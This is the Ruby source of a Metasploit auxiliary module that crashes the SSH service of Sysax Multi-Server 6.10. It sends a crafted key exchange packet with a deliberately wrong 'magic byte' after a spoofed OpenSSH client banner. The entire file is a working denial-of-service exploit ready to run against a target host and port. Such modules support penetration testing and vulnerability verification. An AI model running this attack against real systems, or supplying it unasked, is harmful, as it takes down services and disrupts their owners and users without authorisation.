##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service',
        'Description' => %q{
          This module sends a specially-crafted SSH Key Exchange causing the service to
          crash.
        },
        'Author' => 'Matt "hostess" Andreko <mandreko[at]accuvant.com>',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'OSVDB', '92081'],
          [ 'URL', 'https://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html']
        ],
        'DisclosureDate' => '2013-03-17',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(22),
        OptString.new('CLIENTVERSION', [ true, 'The SSH client version to report.', 'Debian-5ubuntu1'])
      ]
    )
  end

  def get_packet
    delimiter = "\x00" * 3
    packet = [
      0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,
      0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,
      0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,
      0x00, 0x7e
    ].pack('C*')
    packet << Rex::Text.rand_text_alphanumeric(126)
    packet << delimiter
    packet << Rex::Text.rand_text_alphanumeric(16)
    packet << delimiter
    packet << Rex::Text.rand_text_alphanumeric(158)
    packet << delimiter
    packet << Rex::Text.rand_text_alphanumeric(158)
    packet << delimiter
    packet << Rex::Text.rand_text_alphanumeric(106)
    packet << delimiter
    packet << Rex::Text.rand_text_alphanumeric(106)
    packet << delimiter
    packet << "\x28" # Magic byte of death - seems to work with just about
    # anything except \x1a, the value it's supposed to be
    packet << Rex::Text.rand_text_alphanumeric(26)
    packet << delimiter
    packet << Rex::Text.rand_text_alphanumeric(27)
    packet << delimiter * 7
  end

  def run
    connect

    banner = sock.get_once || ''
    print_status("Banner: #{banner.strip}")
    sock.put('SSH-2.0-OpenSSH_5.1p1 ' + datastore['CLIENTVERSION'] + "\r\n" + get_packet)

    # Sometimes the socket closes faster than it can read, sometimes it doesn't, so catch the error just in case.
    begin
      sock.get_once
    rescue Errno::ECONNRESET => e
      vprint_error(e.message)
    end

    disconnect
  end
end
